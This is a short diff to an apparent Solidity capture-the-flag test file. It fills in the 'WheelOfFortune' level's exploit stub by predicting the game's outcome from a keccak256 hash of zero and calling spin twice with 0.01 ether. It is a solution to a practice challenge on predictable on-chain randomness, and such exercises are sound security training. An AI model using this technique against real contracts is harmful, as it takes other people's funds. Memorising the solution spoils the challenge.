@@ -15,7 +15,9 @@ contract WheelOfFortuneTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        uint256 value = uint256(keccak256(abi.encodePacked(bytes32(0)))) % 100;
+        instance.spin{value: 0.01 ether}(value);
+        instance.spin{value: 0.01 ether}(0); 
 
         checkSuccess();
     }
